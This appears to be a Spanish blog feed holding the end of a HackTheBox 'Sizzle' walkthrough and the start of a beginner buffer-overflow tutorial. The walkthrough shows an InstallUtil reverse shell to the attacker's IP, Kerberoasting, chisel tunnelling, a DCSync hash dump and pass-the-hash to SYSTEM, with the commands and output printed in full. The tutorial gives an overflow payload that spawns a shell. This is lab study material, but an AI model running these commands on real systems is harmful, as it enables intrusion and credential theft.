</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; C:<span class="se">\W</span>indows<span class="se">\M</span>icrosoft.NET<span class="se">\F</span>ramework64<span class="se">\v</span>4.0.30319<span class="se">\I</span>nstallUtil.exe /logfile<span class="o">=</span> /LogToConsole<span class="o">=</span><span class="nb">true</span> /revshell<span class="o">=</span><span class="nb">true</span> /rhost<span class="o">=</span>10.10.14.71 /rport<span class="o">=</span>443 /U C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments<span class="se">\P</span>sBypassC
Microsoft <span class="o">(</span>R<span class="o">)</span> .NET Framework Installation utility Version 4.6.1586.0
Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation.  All rights reserved.



The uninstall is beginning.
See the contents of the log file <span class="k">for </span>the C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments<span class="se">\P</span>sBypassCLM.exe assembly<span class="s1">'s progress.
The file is located at .
Uninstalling assembly '</span>C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments<span class="se">\P</span>sBypassCLM.exe<span class="s1">'.
Affected parameters are:
   assemblypath = C:\Users\amanda\Documents\PsBypassCLM.exe
   rport = 443
   revshell = true
   rhost = 10.10.14.71
   logtoconsole = true
   logfile =
Trying to connect back...
</span></code></pre></div></div>

<ul>
  <li>Y ahora ya nos dice Full.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.71] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.103] 50710

PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>htb<span class="se">\a</span>manda
PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; <span class="nv">$ExecutionContext</span>.SessionState.LanguageMode
FullLanguage
PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Y ahora ya solo ejecutas esto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; Import-Module .<span class="se">\S</span>harpHound.ps1
PS C:<span class="se">\U</span>sers<span class="se">\a</span>manda<span class="se">\D</span>ocuments&gt; Invoke-BloodHound <span class="nt">-CollectionMethod</span> All
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a obtener el hash del usuario <code class="language-plaintext highlighter-rouge">kerberoastable</code> con <code class="language-plaintext highlighter-rouge">Rubeus</code> <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries</a>.</p>
  </li>
  <li>
    <p>Recuerda tener tu servidor http con python3 para transferirte los binarios.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; iwr <span class="nt">-uri</span> http://10.10.14.71:8080/Rubeus.exe <span class="nt">-OutFile</span> Rubeus.exe
</code></pre></div></div>

<ul>
  <li>Vamos a hacer el <code class="language-plaintext highlighter-rouge">kerberoasting</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; .<span class="se">\R</span>ubeus.exe kerberoast /creduser:htb.local<span class="se">\a</span>manda /credpassword:Ashare1972

   ______        _
  <span class="o">(</span>_____ <span class="se">\ </span>     | |
   _____<span class="o">)</span> <span class="o">)</span>_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ <span class="se">\|</span> ___ | | | |/___<span class="o">)</span>
  | |  <span class="se">\ \|</span> |_| | |_<span class="o">)</span> <span class="o">)</span> ____| |_| |___ |
  |_|   |_|____/|____/|_____<span class="o">)</span>____/<span class="o">(</span>___/

  v2.2.0


<span class="o">[</span><span class="k">*</span><span class="o">]</span> Action: Kerberoasting

<span class="o">[</span><span class="k">*</span><span class="o">]</span> NOTICE: AES hashes will be returned <span class="k">for </span>AES-enabled accounts.
<span class="o">[</span><span class="k">*</span><span class="o">]</span>         Use /ticket:X or /tgtdeleg to force RC4_HMAC <span class="k">for </span>these accounts.

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target Domain          : HTB.LOCAL
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Searching path <span class="s1">'LDAP://sizzle.HTB.LOCAL/DC=HTB,DC=LOCAL'</span> <span class="k">for</span> <span class="s1">'(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Total kerberoastable <span class="nb">users</span> : 1


<span class="o">[</span><span class="k">*</span><span class="o">]</span> SamAccountName         : mrlky
<span class="o">[</span><span class="k">*</span><span class="o">]</span> DistinguishedName      : <span class="nv">CN</span><span class="o">=</span>mrlky,CN<span class="o">=</span>Users,DC<span class="o">=</span>HTB,DC<span class="o">=</span>LOCAL
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ServicePrincipalName   : http/sizzle
<span class="o">[</span><span class="k">*</span><span class="o">]</span> PwdLastSet             : 7/10/2018 2:08:09 PM
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Supported ETypes       : RC4_HMAC_DEFAULT
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Hash                   : <span class="nv">$krb5tgs$23$*</span>mrlky<span class="nv">$HTB</span>.LOCAL<span class="nv">$http</span>/sizzle@HTB.LOCAL<span class="k">*</span><span class="nv">$A57A767CBB9A6FD9AB5842CC991A</span>
                             46B5<span class="nv">$30E6FC74B860D3B600896EA65C12C4723F1461BF592F0F5FCFA23AC7D162B703E8AE9041A3A</span>
                             31ACD7DCA9F03E702F63FB7FC4E1374C4BD10471FC403CF32F5C92F3EFE40A52D0237EE94C29ACAE
                             9D82ACF068E5BB7BE6006EC22505009F361FAFAB99FD9B5EE640B7F7AD729118738B1BD95E1FBE7F
                             B52445D0E13901A4B133335294E60F70845421A34907C7DA0DE8E658D7AEE8A39B600289A0586B65
                             E595C68ED7EBA4E61BDFCA067D67E2F7D0609E90B000118D050CD060FB7B7680266B424743759EC2
                             D5B9778D452A5D8544E63F1D452FFB4EC4BE32472DF0B4F8422D8C73D7BC602550F0770260563184
                             30B3FA13AACB3866D0820F602236162F668E24FA53F63FF03CE024847B6162529620274B7551386D
                             967C05722EAC2302BA9341AD833DDAC29AA598A9275CFB5B499AC5087D1E5767BEA5F2171825826F
                             2323DF66E632008279D97330988280DD8A961D7067EF8F272640E6E94BE64BDB6A97C2BFAC5BF6FC
                             221D988D5543E8E76D12BBE93E958665FF436C890F365DC15E4A67F363D1C38A16FCED254760E83C
                             3F666E153220A9A31C79B01766247898D0EEC4DDC804AB7A6E48B2B9A712B5AE1B30F9A41548837C
                             C6F617057BDC299CF0D330B7596D3442AA11D6C59734FAA30BD93298D3B6066CE5D9762B0B43B6F5
                             24D4576B6011E8BDDFEC99715FD2463297E094EE06AF9F13344EC6B1133E93EA10EAC18BBB287247
                             10B339B73F43CEC47230ED606CB00FF7781DFA0C0FADA66D2869A1FF0D64D4B07F87E1A19C3C9150
                             DCF1D3C258136BBD9F23873A1709B28C07C55E4C35914EACF0B33D727E57E8B6FE182F77D44BBC6B
                             E56F7295D5EFAC4EC98FF97CB9C71A35B1EEB4F22096BA7AC0D3A83E0A588E8EBB422555AD3C65C2
                             26B7F77C3BBD5C4FE8E35B6A952289A72FCF311E8253FD3D1D6C14B23313610E117088BE234CA81C
                             E749BC83EEFA118A6FB81205879854E8A8D6460C507F28A23E4872289F21C574B56555428E09B861
                             4F6780FC46B33185EE7A00051FEF54738C9D52FCAC78CFB04BE03EB586FD35143C0DCF20CD6511A9
                             267F42BDFFD5891187A9D2194ACE9DD4C705AB43045B122C1A6193E0E2E256E1565BBF65914A116F
                             668AC7F9A10D911E30EE4D9445A85B8E174A7FF4D506428F4E2728056E8999D8E1DC0161EF1CBCCD
                             3CF9FAF77735852D9FD235F4925C0F5BFB042DD5C0F75C7DEFD441A3FEA1FA7710CFED3D5F3D5E09
                             E2303F6B9280367257558FFBD4C1175BDFDFA3C524E94A0AE66D990E87F4C078E31A7DC26CD8AA3C
                             3301E88D7A6413510E57118F1FF45A02309D2D06F8CDFE46A1E46DB8E02D514D1BA156759C96F17A
                             CF0DF039CC8DE358E

PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt;
</code></pre></div></div>

<ul>
  <li>
    <p>La otra forma es hacer un túnel para traernos el puerto 88 de <code class="language-plaintext highlighter-rouge">kerberos</code> hacer un <code class="language-plaintext highlighter-rouge">port Forwarding</code> <a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a>.</p>
  </li>
  <li>
    <p>Vamos a compilarlo y a reducir su tamaño.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  chisel git:<span class="o">(</span>master<span class="o">)</span> go build <span class="nt">-ldflags</span> <span class="s2">"-s -w"</span> <span class="nb">.</span>
go: downloading github.com/gorilla/websocket v1.5.0
go: downloading github.com/jpillora/backoff v1.0.0
go: downloading golang.org/x/crypto v0.16.0
go: downloading golang.org/x/net v0.14.0
go: downloading golang.org/x/sync v0.5.0
go: downloading github.com/jpillora/requestlog v1.0.0
go: downloading github.com/jpillora/sizestr v1.0.0
go: downloading github.com/fsnotify/fsnotify v1.6.0
go: downloading github.com/armon/go-socks5 v0.0.0-20160902184237-e75332964ef5
go: downloading github.com/andrew-d/go-termutil v0.0.0-20150726205930-009166a695a2
go: downloading github.com/jpillora/ansi v1.0.3
go: downloading github.com/tomasen/realip v0.0.0-20180522021738-f0c99a92ddce
go: downloading golang.org/x/sys v0.15.0
go: downloading golang.org/x/text v0.14.0
➜  chisel git:<span class="o">(</span>master<span class="o">)</span> upx chisel
                       Ultimate Packer <span class="k">for </span>eXecutables
                          Copyright <span class="o">(</span>C<span class="o">)</span> 1996 - 2024
UPX 4.2.2       Markus Oberhumer, Laszlo Molnar &amp; John Reiser    Jan 3rd 2024

        File size         Ratio      Format      Name
   <span class="nt">--------------------</span>   <span class="nt">------</span>   <span class="nt">-----------</span>   <span class="nt">-----------</span>
   8999172 -&gt;   3591920   39.91%   linux/amd64   chisel

Packed 1 file.
</code></pre></div></div>

<ul>
  <li>Ahora para el de Windows nos descargamos el que esta aquí <a href="https://github.com/jpillora/chisel/releases">https://github.com/jpillora/chisel/releases</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  chisel git:<span class="o">(</span>master<span class="o">)</span> ✗ file chisel_1.9.1_windows_amd64
chisel_1.9.1_windows_amd64: PE32+ executable <span class="o">(</span>console<span class="o">)</span> x86-64, <span class="k">for </span>MS Windows, 8 sections
➜  chisel git:<span class="o">(</span>master<span class="o">)</span> ✗ <span class="nb">mv </span>chisel_1.9.1_windows_amd64 chisel.exe
➜  chisel git:<span class="o">(</span>master<span class="o">)</span> python3 <span class="nt">-m</span> http.server 8080
Serving HTTP on 0.0.0.0 port 8080 <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; iwr <span class="nt">-uri</span> http://10.10.14.71:80/chisel.exe <span class="nt">-OutFile</span> chisel.exe
PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt;
</code></pre></div></div>

<ul>
  <li>Ahora nosotros seremos el servidor.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  chisel git:<span class="o">(</span>master<span class="o">)</span> ./chisel server <span class="nt">--reverse</span> <span class="nt">-p</span> 1234
2024/05/07 09:03:18 server: Reverse tunnelling enabled
2024/05/07 09:03:18 server: Fingerprint 16dJOQQHSw8JF9qeIlyrDq6K4oNb3xYlOH9kNye/Ors<span class="o">=</span>
2024/05/07 09:03:18 server: Listening on http://0.0.0.0:1234
</code></pre></div></div>

<ul>
  <li>Ahora nos conectamos</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt; .<span class="se">\c</span>hisel.exe client 10.10.14.71:1234 R:88:127.0.0.1:88 R:389:127.0.0.1:389
</code></pre></div></div>

<ul>
  <li>Y ya podemos obtener el hash de esta forma.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  chisel git:<span class="o">(</span>master<span class="o">)</span> impacket-GetUserSPNs htb.local/amanda:Ashare1972 <span class="nt">-request</span> <span class="nt">-dc-ip</span> 127.0.0.1
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName  Name   MemberOf                                               PasswordLastSet             LastLogon                   Delegation
<span class="nt">--------------------</span>  <span class="nt">-----</span>  <span class="nt">-----------------------------------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
http/sizzle           mrlky  <span class="nv">CN</span><span class="o">=</span>Remote Management Users,CN<span class="o">=</span>Builtin,DC<span class="o">=</span>HTB,DC<span class="o">=</span>LOCAL  2018-07-10 13:08:09.536421  2018-07-12 09:23:50.871575      



<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="nv">$krb5tgs$23$*</span>mrlky<span class="nv">$HTB</span>.LOCAL<span class="nv">$htb</span>.local/mrlky<span class="k">*</span><span class="nv">$f3ca9959c7886d16612228c798ff9096$69b1e07dccf94e836a5c99dd0779485a9ef5d98f8b468736c345a2477bac34f11098aa89aa900300f4577f830743709f8820db8488a1b0a45f41d479444cc2d941b70a8d09b7ab6ec04acb46c083754a5981c9baed7225411f084be6cc07410c8efcf01b2485319f6fe471502efd0d5a72021433c7c86dc73bf941882f0b847a5cec47adf4b5b3e18320bf7fbf79b919a7355d9f624339a8f236314be83e84f5b42b2eea4a9ca3b3f28cbb09fb946edaba77e304ec4ef49d787a8a242b746213930b13ccce74e8133b4b3c4bf77ba650be143c882ef41f4cc15848505f1311e7c1f8464677bb8e55fbe300245d1450edc5f828a374def3152ca0d1bcb1bf73cc6b3b9a0f36b1bc96d3240288af5ee807b8f8f0184eac0d7ea2d5232b70d3ff4636f62bad5fbc04392d2d77e885cad8707ce98f77c5b5c6bb92926d75d220d93a6b6ccb55a8acd4666c16eacbabbc866e007d67e3a9da248ae0dd17a737802fce1d428ec261462f63b515572cf0629d8b8d48e08ff0bbfbb79af8cddc9b3449904ceeb54707fc84a6a1948a8749cba0be396ded735bf950e842ff385995928f72f79518c7f6fbdd75c816d39325a7cb34247da7cb64ca954e3aa3365ee766008690dfde68cae566c4c00f4a461ec994ebe1b074cddd23431f9c2424394deab4aa469df2d6357b38d5c10a3021871d4b7580bb2df1b0e1e154bcf01190b48478735fa3732ecfa49eb7ca038fa589b8620dd9c966c210c809f9e11b5b40adabfe0011fa63ca0246f9fdf89ec581c55c5118bf5202516ece9da1fe2a58340335269ed904dd2f1da10ef88f8f0a0b2c375ce8c0ed55a7f110e49c85359a8eb09807dbe2edc3d96d82486ec95993c0ec2b41a8cd2df9a24eae7499d6f11613cc7d484b2bacea6558453a7fd8fd68572f0cd9713061ee3523f8df77ead9134915150a510d4b5c7c37ebb614ec8950228a06dc4eaa0330afcccd52e20466334661f74dc97942de4cb9eea41e03f6ca385c21ed024ac6bb953ddff3350df93d5d80b8264f5471297ec585d4ade095a4d233a41e5115dedfdd03fc6a13434b3ec02ee35fb2a71c37cbb25c4b86d68ace0c57c6fe35ed2699e5eecc0ca631178ce945068d7a6a07499502f2a762eb6d950a4fba46bce7454871b38562d9c7ec95e0f86c1e8befc0ae3ae2011bc1fcfe22c980965bcaf93cc09b14f211b80e5e429b222055f579f8a52258eff5fc7f0d77feb5ecaaca897513922b020eda</span>
</code></pre></div></div>

<ul>
  <li>Ahora ya crackeamos el hash para ver la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt hash2
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5tgs, Kerberos 5 TGS etype 23 <span class="o">[</span>MD4 HMAC-MD5 RC4]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Football#7       <span class="o">(</span>?<span class="o">)</span>
1g 0:00:00:17 DONE <span class="o">(</span>2024-05-07 09:06<span class="o">)</span> 0.05691g/s 635585p/s 635585c/s 635585C/s Forever3!..FokinovaS1
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>En esta ruta del sistema encontré un <code class="language-plaintext highlighter-rouge">.txt</code> donde había hashes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32&gt; <span class="nb">type </span>file.txt
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c718f548c75062ada93250db208d3178:::

Domain    User  ID  Hash
<span class="nt">------</span>    <span class="nt">----</span>  <span class="nt">--</span>  <span class="nt">----</span>
HTB.LOCAL Guest 501 -
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrb3n:1105:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::


PS C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32&gt;
</code></pre></div></div>

<ul>
  <li>Como el usuario mrlky tiene privilegios <code class="language-plaintext highlighter-rouge">DCSync</code> y aparte tenemos su hash podemos usar <code class="language-plaintext highlighter-rouge">crackmapexec</code> para ver el hash del administrador y conectarnos con <code class="language-plaintext highlighter-rouge">psexec</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.10.103 <span class="nt">-u</span> mrlky <span class="nt">-H</span> bceef4f6fe9c026d1d8dec8dce48adef <span class="nt">--ntds</span> drsuapi
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 14393 x64 <span class="o">(</span>name:SIZZLE<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span>+] HTB.LOCAL<span class="se">\m</span>rlky:bceef4f6fe9c026d1d8dec8dce48adef
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span>+] Dumping the NTDS, this could take a <span class="k">while </span>so go grab a redbull...
SMB         10.10.10.103    445    SIZZLE           Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
SMB         10.10.10.103    445    SIZZLE           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.103    445    SIZZLE           krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
SMB         10.10.10.103    445    SIZZLE           DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.103    445    SIZZLE           amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
SMB         10.10.10.103    445    SIZZLE           mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
SMB         10.10.10.103    445    SIZZLE           sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
SMB         10.10.10.103    445    SIZZLE           SIZZLE<span class="nv">$:</span>1001:aad3b435b51404eeaad3b435b51404ee:91537ada1c7e820e40c8f13bcbb4e42a:::
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span>+] Dumped 8 NTDS hashes to /home/miguel/.cme/logs/SIZZLE_10.10.10.103_2024-05-07_091141.ntds of which 7 were added to the database
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-psexec htb.local/Administrator@sizzle.htb.local <span class="nt">-hashes</span> :f6b7160bfc91823792e0ac3a162c9267
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on sizzle.htb.local.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file PVZdBnKc.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on sizzle.htb.local.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service daJw on sizzle.htb.local.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service daJw.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.14393]
<span class="o">(</span>c<span class="o">)</span> 2016 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<ul>
  <li>Vamos hacerlo sin el hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.10.103 <span class="nt">-u</span> mrlky <span class="nt">-p</span> Football#7 <span class="nt">--ntds</span> drsuapi
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 14393 x64 <span class="o">(</span>name:SIZZLE<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span>+] HTB.LOCAL<span class="se">\m</span>rlky:Football#7
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
SMB         10.10.10.103    445    SIZZLE           <span class="o">[</span>+] Dumping the NTDS, this could take a <span class="k">while </span>so go grab a redbull...
SMB         10.10.10.103    445    SIZZLE           Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
SMB         10.10.10.103    445    SIZZLE           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.103    445    SIZZLE           krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
SMB         10.10.10.103    445    SIZZLE           DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.103    445    SIZZLE           amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
SMB         10.10.10.103    445    SIZZLE           mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
SMB         10.10.10.103    445    SIZZLE           sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
SMB         10.10.10.103    445    SIZZLE           SIZZLE<span class="nv">$:</span>1001:aad3b435b51404eeaad3b435b51404ee:91537ada1c7e820e40c8f13bcbb4e42a:::
</code></pre></div></div>

<h2 id="root-flag-and-user-flag">Root flag and user flag</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
2551eafa119b3d4d6c7e1e28db9dec74
C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\m</span>rlky<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
e1c1537f865b3f1aad46459eb491e08a
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/insane" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Buffer Overflow For Beginners and Ret2libc</title><link href="http://localhost:4000/vulnhub/machines/2024/05/03/buffer.html" rel="alternate" type="text/html" title="Buffer Overflow For Beginners and Ret2libc" /><published>2024-05-03T00:00:00-06:00</published><updated>2024-05-03T00:00:00-06:00</updated><id>http://localhost:4000/vulnhub/machines/2024/05/03/buffer</id><content type="html" xml:base="http://localhost:4000/vulnhub/machines/2024/05/03/buffer.html"><![CDATA[<p align="center">
<img src="/assets/vulnhub/buff/icon.png" />
</p>

<h2 id="level-one">Level One</h2>

<blockquote>
  <p>Comparación de caracteres.</p>
</blockquote>

<blockquote>
  <p>Vamos a desactivar el ASRL temporalmente.</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">echo </span>0 | <span class="nb">sudo tee</span> /proc/sys/kernel/randomize_va_space
0
</code></pre></div></div>

<ul>
  <li>
    <p>Lo primero que vamos hacer es analizar el código que esta escrito en C.</p>
  </li>
  <li>
    <p>Vemos que se esta definiendo un Buffer de tamaño 32 bytes, esta asignado una variable <code class="language-plaintext highlighter-rouge">long key</code> con valor <code class="language-plaintext highlighter-rouge">0x12345678</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/vulnhub/buff/1.png" />
</p>

<ul>
  <li>Esta es la parte interesante ya que vemos que si se igual el valor <code class="language-plaintext highlighter-rouge">key</code> a <code class="language-plaintext highlighter-rouge">0x42424242</code> se va ejecutar una <code class="language-plaintext highlighter-rouge">/bin/sh</code> que es el objetivo en caso de que no sea ese valor no se hará nada.</li>
</ul>

<pre><code class="language-C">if(key == 0x42424242) {
        execve("/bin/sh", 0, 0);
    }
    else {
        printf("%s\n", "Sorry try again...");
    }
</code></pre>

<ul>
  <li>Para saber a cuanto equivale el valor <code class="language-plaintext highlighter-rouge">key</code> podemos hacerlo desde <code class="language-plaintext highlighter-rouge">bash</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels <span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">42"</span>
B%
</code></pre></div></div>

<ul>
  <li>
    <p>Como sabemos que equivale ala letra <code class="language-plaintext highlighter-rouge">B</code> vemos que esta igualado a <code class="language-plaintext highlighter-rouge">4</code> <code class="language-plaintext highlighter-rouge">B</code> para poder obtener la <code class="language-plaintext highlighter-rouge">Bash</code> que necesitamos necesitamos enviar el tamaño del Buff que son <code class="language-plaintext highlighter-rouge">32 bytes</code> + las B para que la condición se true y se ejecute.</p>
  </li>
  <li>
    <p>Vamos a crear un script rápido en <code class="language-plaintext highlighter-rouge">python</code> que haga todo lo que necesitamos.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python2</span>

first <span class="o">=</span> b<span class="s2">"A"</span> <span class="k">*</span> 32 <span class="c"># le pasamos 32 veces A para el buffer</span>

key <span class="o">=</span> b<span class="s2">"B"</span> <span class="k">*</span> 4 <span class="c"># le pasamos las 4 B </span>

print<span class="o">(</span>first + key<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Al cumplirse todas las condiciones nos debería de otorgar una <code class="language-plaintext highlighter-rouge">bash</code> como el usuario que esta corriendo el binario en este caso será mi usuario ya que yo lo estoy ejecutando.</p>
  </li>
  <li>
    <p>Allí podemos ver los <code class="language-plaintext highlighter-rouge">prints</code> que se cumplen y por eso nos otorga la <code class="language-plaintext highlighter-rouge">bash</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  levels ./levelOne <span class="si">$(</span>python2 scriptOne.py<span class="si">)</span>
Buf is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Key is: 0x42424242
<span class="nv">$ </span><span class="nb">whoami
</span>miguel
</code></pre></div></div>

<h2 id="leveltwo">LevelTwo</h2>

<blockquote>
  <p>Llamada a la dirección de una función que te otorga una /bin/sh.</p>
</blockquote>

<ul>
  <li>
    <p>Continuamos con el nivel 2 vamos a ver el código.</p>
  </li>
  <li>
